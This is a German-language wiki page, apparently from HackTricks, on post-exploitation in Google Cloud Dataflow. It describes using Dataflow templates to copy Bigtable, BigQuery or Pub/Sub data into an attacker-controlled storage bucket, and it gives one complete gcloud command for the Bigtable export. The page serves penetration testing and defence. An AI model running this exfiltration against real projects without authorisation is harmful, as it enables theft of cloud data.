# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Weitere Informationen zu Dataflow:

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### Dataflow verwenden, um Daten aus anderen Diensten zu exfiltrieren

**Berechtigungen:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (über ein SA mit Zugriff auf Quelle und Ziel)

Mit Rechten zum Erstellen von Dataflow-Jobs können Sie GCP Dataflow-Templates verwenden, um Daten aus Bigtable, BigQuery, Pub/Sub und anderen Diensten in vom Angreifer kontrollierte GCS-Buckets zu exportieren. Dies ist eine mächtige Post-Exploitation-Technik, wenn Sie Dataflow-Zugriff erlangt haben — zum Beispiel über den [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation (pipeline takeover via bucket write).

> [!NOTE]
> Sie benötigen `iam.serviceAccounts.actAs` auf einem service account mit ausreichenden Berechtigungen, um die Quelle zu lesen und in den Sink zu schreiben. Standardmäßig wird das Compute Engine default SA verwendet, wenn keiner angegeben ist.

#### Bigtable zu GCS

Siehe [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket" für das vollständige Muster. Templates: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Bigtable in einen vom Angreifer kontrollierten Bucket exportieren</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery nach GCS

Dataflow-Vorlagen existieren, um BigQuery-Daten zu exportieren. Verwende die passende Vorlage für dein Ziel-Format (JSON, Avro, etc.) und leite die Ausgabe in deinen Bucket.

#### Pub/Sub und Streaming-Quellen

Streaming-Pipelines können von Pub/Sub (oder anderen Quellen) lesen und in GCS schreiben. Starte einen Job mit einer Vorlage, die von der Ziel-Pub/Sub-Subscription liest und in deinen kontrollierten Bucket schreibt.

## Referenzen

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
